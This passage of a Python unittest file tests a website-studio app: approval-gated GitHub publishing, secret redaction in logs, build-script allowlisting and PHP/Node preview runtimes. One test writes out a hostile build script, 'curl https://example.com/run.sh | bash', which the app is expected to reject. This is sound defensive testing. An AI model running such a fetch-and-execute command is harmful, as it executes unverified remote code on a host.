            request_id = request_payload["publish_request"]["id"]
            status, approval_payload = handle_action(
                data_root,
                {
                    "action": "approval_record",
                    "site_id": site_id,
                    "approval_action": "publish",
                    "target_id": request_id,
                    "approved_by": "user:owner",
                    "_app_actor": _approval_actor(),
                    "confirm": True,
                },
            )
            self.assertEqual(status, 201)

            transport = FakeGitHubTransport()
            status, published = handle_action(
                data_root,
                {
                    "action": "publish",
                    "site_id": site_id,
                    "publish_request_id": request_id,
                    "approval_id": approval_payload["approval"]["id"],
                    "_app_secrets": {"github-token": "test-github-token"},
                    "_github_transport": transport,
                },
            )

            self.assertEqual(status, 200)
            self.assertEqual(published["deployment"]["mode"], "github_pull_request")
            source_ref = published["deployment"]["source_ref"]
            self.assertEqual(source_ref["provider"], "github")
            self.assertEqual(source_ref["status"], "pull_request_open")
            self.assertEqual(source_ref["pull_request_url"], "https://github.com/example-org/site-web/pull/42")
            self.assertEqual(source_ref["working_branch"], f"maverick/{site_id}/{request_id.replace('_', '-')}")
            self.assertNotIn("test-github-token", json.dumps(published))
            auth_headers = [call[2]["headers"]["Authorization"] for call in transport.calls]
            self.assertTrue(all(header == "Bearer test-github-token" for header in auth_headers))

    def test_phase2_github_publish_updates_existing_branch_without_force(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            data_root = Path(tmp)
            status, prepared = handle_action(data_root, {"action": "git_connection_prepare", "repository_url": "example-org/site-web"})
            self.assertEqual(status, 201)
            site_id = prepared["site"]["id"]
            status, _activated = handle_action(
                data_root,
                {
                    "action": "git_connection_activate",
                    "connection_id": prepared["connection"]["id"],
                    "grant_id": "grant:default:website-studio:github-token:test",
                    "confirm_no_raw_secret": True,
                },
            )
            self.assertEqual(status, 200)
            _edit_index(data_root, site_id, marker="Existing branch")
            status, request_payload = handle_action(data_root, {"action": "publish_request", "site_id": site_id})
            self.assertEqual(status, 201)
            request_id = request_payload["publish_request"]["id"]
            status, approval_payload = handle_action(
                data_root,
                {
                    "action": "approval_record",
                    "site_id": site_id,
                    "approval_action": "publish",
                    "target_id": request_id,
                    "approved_by": "user:owner",
                    "_app_actor": _approval_actor(),
                    "confirm": True,
                },
            )
            self.assertEqual(status, 201)

            transport = ExistingBranchGitHubTransport()
            status, published = handle_action(
                data_root,
                {
                    "action": "publish",
                    "site_id": site_id,
                    "publish_request_id": request_id,
                    "approval_id": approval_payload["approval"]["id"],
                    "_app_secrets": {"github-token": "test-github-token"},
                    "_github_transport": transport,
                },
            )

            self.assertEqual(status, 200)
            self.assertEqual(published["deployment"]["source_ref"]["pull_request_number"], 43)
            patch_calls = [call for call in transport.calls if call[0] == "PATCH"]
            self.assertEqual(len(patch_calls), 1)
            patch_body = patch_calls[0][2]["json"]
            self.assertEqual(patch_body["sha"], "commit-sha")
            self.assertIs(patch_body["force"], False)

    def test_phase2_github_publish_blocks_existing_branch_conflict_without_force(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            data_root = Path(tmp)
            status, prepared = handle_action(data_root, {"action": "git_connection_prepare", "repository_url": "example-org/site-web"})
            self.assertEqual(status, 201)
            site_id = prepared["site"]["id"]
            status, _activated = handle_action(
                data_root,
                {
                    "action": "git_connection_activate",
                    "connection_id": prepared["connection"]["id"],
                    "grant_id": "grant:default:website-studio:github-token:test",
                    "confirm_no_raw_secret": True,
                },
            )
            self.assertEqual(status, 200)
            _edit_index(data_root, site_id, marker="Branch conflict")
            status, request_payload = handle_action(data_root, {"action": "publish_request", "site_id": site_id})
            self.assertEqual(status, 201)
            request_id = request_payload["publish_request"]["id"]
            status, approval_payload = handle_action(
                data_root,
                {
                    "action": "approval_record",
                    "site_id": site_id,
                    "approval_action": "publish",
                    "target_id": request_id,
                    "approved_by": "user:owner",
                    "_app_actor": _approval_actor(),
                    "confirm": True,
                },
            )
            self.assertEqual(status, 201)

            transport = ConflictingBranchGitHubTransport()
            status, blocked = handle_action(
                data_root,
                {
                    "action": "publish",
                    "site_id": site_id,
                    "publish_request_id": request_id,
                    "approval_id": approval_payload["approval"]["id"],
                    "_app_secrets": {"github-token": "test-github-token"},
                    "_github_transport": transport,
                },
            )

            self.assertEqual(status, 403)
            self.assertTrue(blocked["blocked"])
            self.assertEqual(blocked["status"], "blocked_github_branch_conflict")
            self.assertIn("without force", blocked["detail"])
            self.assertIs(transport.seen_patch_body["force"], False)
            self.assertFalse(any(call[0] == "POST" and call[1].endswith("/pulls") for call in transport.calls))

    def test_phase2_github_publish_missing_secret_blocks_before_approval_is_consumed(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            data_root = Path(tmp)
            status, prepared = handle_action(data_root, {"action": "git_connection_prepare", "repository_url": "example-org/site-web"})
            self.assertEqual(status, 201)
            site_id = prepared["site"]["id"]
            status, _activated = handle_action(
                data_root,
                {
                    "action": "git_connection_activate",
                    "connection_id": prepared["connection"]["id"],
                    "grant_id": "grant:default:website-studio:github-token:test",
                    "confirm_no_raw_secret": True,
                },
            )
            self.assertEqual(status, 200)
            _edit_index(data_root, site_id, marker="Blocked")
            status, request_payload = handle_action(data_root, {"action": "publish_request", "site_id": site_id})
            self.assertEqual(status, 201)
            request_id = request_payload["publish_request"]["id"]
            status, approval_payload = handle_action(
                data_root,
                {
                    "action": "approval_record",
                    "site_id": site_id,
                    "approval_action": "publish",
                    "target_id": request_id,
                    "approved_by": "user:owner",
                    "_app_actor": _approval_actor(),
                    "confirm": True,
                },
            )
            self.assertEqual(status, 201)

            status, blocked = handle_action(
                data_root,
                {
                    "action": "publish",
                    "site_id": site_id,
                    "publish_request_id": request_id,
                    "approval_id": approval_payload["approval"]["id"],
                    "_app_secret_errors": [{"logical_name": "github-token"}],
                },
            )

            self.assertEqual(status, 403)
            self.assertTrue(blocked["blocked"])
            self.assertIn("Core Secrets did not deliver", blocked["detail"])
            status, approvals = handle_action(data_root, {"action": "approvals_list", "site_id": site_id})
            self.assertEqual(status, 200)
            approval = next(item for item in approvals["items"] if item["id"] == approval_payload["approval"]["id"])
            self.assertEqual(approval["status"], "approved")
            self.assertIsNone(approval["used_at"])

    def test_phase2_secret_redaction_covers_github_tokens_bearer_and_inline_credentials(self) -> None:
        raw = (
            "https://user:ghp_inlineSecret@example.com/repo.git "
            "Bearer github_pat_runtimeSecret ghp_apiSecret"
        )
        redacted = _redact_secret_text(raw)
        self.assertNotIn("ghp_inlineSecret", redacted)
        self.assertNotIn("github_pat_runtimeSecret", redacted)
        self.assertNotIn("ghp_apiSecret", redacted)
        self.assertIn("https://***:***@example.com/repo.git", redacted)
        detail = _github_error_detail({"message": "failed with Bearer ghp_errorSecret and github_pat_errorSecret"})
        self.assertNotIn("ghp_errorSecret", detail)
        self.assertNotIn("github_pat_errorSecret", detail)

    def test_phase3a_build_plan_expands_giuntitrail_allowlisted_scripts(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            source_root = Path(tmp)
            (source_root / "package-lock.json").write_text("{}", encoding="utf-8")
            (source_root / "package.json").write_text(
                json.dumps(
                    {
                        "scripts": {
                            "build": "npm run build:css && npm run build:js",
                            "build:css": "npm run css:compile && npm run css:prefix && npm run css:minify",
                            "build:js": "webpack --mode production --config webpack.config.js",
                            "css:compile": "sass frontend-website/src/css/main.scss frontend-website/dist/css/style.css --style=expanded",
                            "css:prefix": "postcss frontend-website/dist/css/style.css --use autoprefixer -o frontend-website/dist/css/style.prefixed.css",
                            "css:minify": "cssnano frontend-website/dist/css/style.prefixed.css frontend-website/dist/css/style.min.css && rm frontend-website/dist/css/style.prefixed.css",
                        }
                    }
                ),
                encoding="utf-8",
            )

            plan = build_plan_for_source(source_root)

            self.assertFalse(plan.missing_requirements)
            self.assertEqual([command[0] for command in plan.commands], ["sass", "postcss", "cssnano", "rm", "webpack"])

    def test_phase3a_build_plan_rejects_node_sass_native_binary(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            source_root = Path(tmp)
            (source_root / "package-lock.json").write_text("{}", encoding="utf-8")
            (source_root / "package.json").write_text(
                json.dumps({"scripts": {"build": "node-sass input.scss output.css --output-style expanded"}}),
                encoding="utf-8",
            )

            plan = build_plan_for_source(source_root)

            self.assertFalse(plan.commands)
            self.assertIn("Dart Sass", " ".join(plan.missing_requirements))

    def test_phase3a_workspace_binary_resolution_returns_absolute_path(self) -> None:
        with tempfile.TemporaryDirectory(dir=Path.cwd()) as tmp:
            source_root = Path(tmp).relative_to(Path.cwd())
            bin_dir = source_root / "node_modules" / ".bin"
            bin_dir.mkdir(parents=True)
            sass_bin = bin_dir / "sass"
            sass_bin.write_text("#!/usr/bin/env node\n", encoding="utf-8")

            resolved = _resolve_workspace_binary(source_root, "sass")

            self.assertTrue(resolved.is_absolute())
            self.assertEqual(resolved, sass_bin.resolve())

    def test_phase3a_build_validate_updates_existing_sitemap_route_from_runtime_render(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            data_root = Path(tmp)
            archive = BytesIO()
            with ZipFile(archive, "w") as zip_file:
                zip_file.writestr("index.php", "<?php echo '<title>Runtime</title>';")
                zip_file.writestr(
                    "sitemap.xml",
                    """<?xml version="1.0" encoding="UTF-8"?>
<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
  <url><loc>https://example.com/camp</loc></url>
</urlset>
""",
                )
            encoded = base64.b64encode(archive.getvalue()).decode("ascii")
            status, imported = handle_action(data_root, {"action": "import_zip", "display_name": "Runtime Routes", "archive_base64": encoded})
            self.assertEqual(status, 201)
            site_id = imported["site"]["id"]
            status, map_payload = handle_action(data_root, {"action": "sitemap", "site_id": site_id})
            self.assertEqual(status, 200)
            self.assertEqual(map_payload["routes"][0]["status"], "unmatched")

            with patch(
                "store.prepare_runtime_build",
                return_value={
                    "status": "passed",
                    "artifact_ref": {"runtime_root": "sites/site_test/builds/build_test/runtime"},
                    "warnings": [],
                    "missing_requirements": [],
                    "logs_summary": "Runtime artifact prepared.",
                },
            ), patch(
                "store.render_runtime_preview",
                return_value={
                    "status": "ready",
                    "runtime_kind": "php",
                    "raw_html": "<title>Camp</title>",
                    "title": "Camp",
                    "source_files": ["index.php"],
                    "warnings": [],
                    "missing_requirements": [],
                    "http_status": 200,
                },
            ):
                status, build_payload = handle_action(data_root, {"action": "build_validate", "site_id": site_id})

            self.assertEqual(status, 201)
            self.assertEqual(build_payload["build"]["status"], "passed")
            status, refreshed_map = handle_action(data_root, {"action": "sitemap", "site_id": site_id})
            self.assertEqual(status, 200)
            routes = {item["route"]: item for item in refreshed_map["routes"]}
            self.assertEqual(routes["/camp"]["status"], "rendered")
            self.assertEqual(routes["/camp"]["kind"], "php")
            self.assertTrue(routes["/camp"]["page_id"])
            self.assertEqual([item["route"] for item in refreshed_map["items"]], ["/camp"])
            status, status_payload = handle_action(data_root, {"action": "site_status", "site_id": site_id})
            self.assertEqual(status, 200)
            self.assertEqual(status_payload["runtime_status"], "ready")
            self.assertEqual(status_payload["runtime"]["runtime_status"], "ready")

    def test_phase3a_runtime_crawler_adds_internal_rendered_links(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            data_root = Path(tmp)
            archive = BytesIO()
            with ZipFile(archive, "w") as zip_file:
                zip_file.writestr("frontend-website/index.php", "<?php echo 'Home';")
            encoded = base64.b64encode(archive.getvalue()).decode("ascii")
            status, imported = handle_action(data_root, {"action": "import_zip", "display_name": "Runtime Crawl", "archive_base64": encoded})
            self.assertEqual(status, 201)
            site_id = imported["site"]["id"]

            def fake_render(_data_root: Path, _source_root: Path, *, route: str, source_profile: dict[str, object], artifact_ref: dict[str, object]) -> dict[str, object]:
                html = "<title>Home</title><a href=\"/camp\">Camp</a>" if route == "/" else "<title>Camp</title>"
                return {
                    "status": "ready",
                    "runtime_kind": "php",
                    "raw_html": html,
                    "title": "Home" if route == "/" else "Camp",
                    "source_files": ["frontend-website/index.php"],
                    "warnings": [],
                    "missing_requirements": [],
                    "http_status": 200,
                }

            with patch(
                "store.prepare_runtime_build",
                return_value={
                    "status": "passed",
                    "artifact_ref": {"runtime_root": "sites/site_test/builds/build_test/runtime"},
                    "warnings": [],
                    "missing_requirements": [],
                    "logs_summary": "Runtime artifact prepared.",
                },
            ), patch("store.render_runtime_preview", side_effect=fake_render):
                status, build_payload = handle_action(data_root, {"action": "build_validate", "site_id": site_id})

            self.assertEqual(status, 201)
            self.assertEqual(build_payload["build"]["status"], "passed")
            status, refreshed_map = handle_action(data_root, {"action": "sitemap", "site_id": site_id})
            self.assertEqual(status, 200)
            routes = {item["route"]: item for item in refreshed_map["routes"]}
            self.assertEqual(routes["/camp"]["status"], "rendered")
            self.assertTrue(routes["/camp"]["page_id"])

    def test_phase3a_internal_route_parser_keeps_only_local_routes(self) -> None:
        routes = internal_routes_from_html(
            '<a href="/about/index.html">About</a><a href="team.html">Team</a><a href="https://example.com/offsite">External</a><a href="mailto:a@example.com">Mail</a>',
            base_route="/company/",
        )

        self.assertEqual(routes, ["/about", "/company/team"])

    def test_phase3a_workspace_binary_resolution_does_not_use_host_path(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            with patch("preview_runtime.shutil.which", return_value="/usr/bin/vite"):
                with self.assertRaisesRegex(ValueError, "local npm dependencies"):
                    _resolve_workspace_binary(Path(tmp), "vite")

    def test_phase3a_runtime_logs_redact_host_paths_and_secrets(self) -> None:
        summary = _bounded_log(
            "failed at /home/ubuntu/projects/maverick-v3/workspaces/default/data/website-studio/.tmp/runtime_build_x token=abc ghp_123456789012345678901234"
        )

        self.assertNotIn("/home/ubuntu", summary)
        self.assertNotIn("token=abc", summary)
        self.assertNotIn("ghp_123456789012345678901234", summary)

    def test_phase3a_safe_env_uses_app_local_home_and_tmpdir(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            cwd = Path(tmp) / "source"
            cwd.mkdir()
            env = _safe_env(cwd)

            self.assertNotEqual(env.get("HOME"), os.environ.get("HOME"))
            self.assertTrue(str(env["HOME"]).startswith(str(cwd.parent)))
            self.assertTrue(str(env["TMPDIR"]).startswith(str(cwd.parent)))
            self.assertTrue(Path(env["HOME"]).is_dir())
            self.assertTrue(Path(env["TMPDIR"]).is_dir())
            self.assertEqual(env["NPM_CONFIG_IGNORE_SCRIPTS"], "true")
            self.assertNotIn("MAVERICK_SECRET_STORE_KEY", env)

    def test_phase3a_list_changes_redacts_historical_build_logs_on_read(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            data_root = Path(tmp)
            status, created = handle_action(data_root, {"action": "site_create", "display_name": "Logs"})
            self.assertEqual(status, 201)
            site_id = created["site"]["id"]
            with closing(sqlite3.connect(data_root / "app.sqlite")) as db, db:
                db.execute(
                    """
                    INSERT INTO builds(
                      id, site_id, status, runtime_kind, preview_url, artifact_ref_json,
                      source_profile_json, route_count, asset_count, warnings_json,
                      missing_requirements_json, logs_summary, created_at, updated_at
                    )
                    VALUES (?, ?, 'failed', 'php', '', '{}', '{}', 0, 0, '[]', '[]', ?, '2026-01-01T00:00:00+00:00', '2026-01-01T00:00:00+00:00')
                    """,
                    (
                        "build_redact",
                        site_id,
                        "Error: /home/ubuntu/projects/maverick-v3/workspaces/default/data/website-studio/.tmp/build token=abc",
                    ),
                )

            status, changes = handle_action(data_root, {"action": "list_changes", "site_id": site_id})
            self.assertEqual(status, 200)
            build = next(item for item in changes["builds"] if item["id"] == "build_redact")
            self.assertNotIn("/home/ubuntu", build["logs_summary"])
            self.assertNotIn("token=abc", build["logs_summary"])

    def test_phase3a_build_plan_rejects_unallowlisted_shell_commands(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            source_root = Path(tmp)
            (source_root / "package-lock.json").write_text("{}", encoding="utf-8")
            (source_root / "package.json").write_text('{"scripts":{"build":"curl https://example.com/run.sh | bash"}}', encoding="utf-8")

            plan = build_plan_for_source(source_root)

            self.assertFalse(plan.commands)
            self.assertIn("not allowlisted", " ".join(plan.missing_requirements))

    def test_phase3a_runtime_capability_reports_missing_php_binary(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            source_root = Path(tmp)
            (source_root / "package-lock.json").write_text("{}", encoding="utf-8")
            (source_root / "package.json").write_text('{"scripts":{"build":"vite build"}}', encoding="utf-8")

            with patch("preview_runtime.shutil.which", return_value=None):
                capability = runtime_capability_status(
                    source_root,
                    {"preview_runtime_kind": "php", "has_package_manifest": True, "missing_requirements": []},
                )

            self.assertEqual(capability["runtime_status"], "blocked")
            self.assertIn("php executable", " ".join(capability["missing_requirements"]))

    def test_phase3a_php_runtime_without_package_manifest_does_not_require_node_build(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            data_root = Path(tmp) / "data"
            source_root = Path(tmp) / "source"
            source_root.mkdir()
            (source_root / "index.php").write_text("<?php echo 'Home';", encoding="utf-8")

            with patch("preview_runtime.shutil.which", return_value="/usr/bin/php"):
                result = prepare_runtime_build(
                    data_root,
                    "site_test",
                    source_root,
                    build_id="build_test",
                    source_profile={"preview_runtime_kind": "php", "has_package_manifest": False, "php_docroot": "."},
                )

            self.assertEqual(result["status"], "passed")
            self.assertEqual(result["missing_requirements"], [])
            self.assertNotIn("package.json", result["logs_summary"])
            self.assertTrue((data_root / "sites" / "site_test" / "builds" / "build_test" / "runtime" / "index.php").exists())

    def test_phase3a_php_preview_server_is_reused_for_matching_runtime_key(self) -> None:
        class FakeProcess:
            def __init__(self) -> None:
                self.terminated = False

            def poll(self):
                return None if not self.terminated else 0

            def terminate(self) -> None:
                self.terminated = True

            def communicate(self, timeout=None):
                return "", ""

            def kill(self) -> None:
                self.terminated = True

        with tempfile.TemporaryDirectory() as tmp:
            runtime_root = Path(tmp)
            docroot = runtime_root / "public"
            docroot.mkdir()
            fake_process = FakeProcess()

            def fake_start(key, root, docroot_path, router):
                return PhpPreviewServer(
                    key=key,
                    port=43210,
                    pid=os.getpid(),
                    process=fake_process,
                    runtime_root=root,
                    docroot=docroot_path,
                    router=router,
                    last_used=time.time(),
                )

            try:
                with patch("preview_runtime._start_php_preview_server", side_effect=fake_start) as start_server:
                    first = _php_preview_server(runtime_root, docroot, None)
                    second = _php_preview_server(runtime_root, docroot, None)
                    self.assertIs(first, second)
                    self.assertEqual(start_server.call_count, 1)
            finally:
                _shutdown_php_preview_servers()

    def test_phase3a_node_build_without_lockfile_is_blocked_before_execution(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            data_root = Path(tmp)
            archive = BytesIO()
            with ZipFile(archive, "w") as zip_file:
                zip_file.writestr("index.html", "<title>Build</title>")
                zip_file.writestr("package.json", '{"scripts":{"build":"vite build"}}')
            encoded = base64.b64encode(archive.getvalue()).decode("ascii")
            status, imported = handle_action(data_root, {"action": "import_zip", "display_name": "Build", "archive_base64": encoded})
            self.assertEqual(status, 201)

            status, build_payload = handle_action(data_root, {"action": "build_validate", "site_id": imported["site"]["id"]})
            self.assertEqual(status, 201)
            self.assertEqual(build_payload["build"]["status"], "blocked")
            self.assertEqual(build_payload["build"]["runtime_kind"], "node_build")
            self.assertIn("package-lock.json", " ".join(build_payload["build"]["missing_requirements"]))
            self.assertEqual(build_payload["build"]["artifact_ref"], {})


if __name__ == "__main__":
    unittest.main()
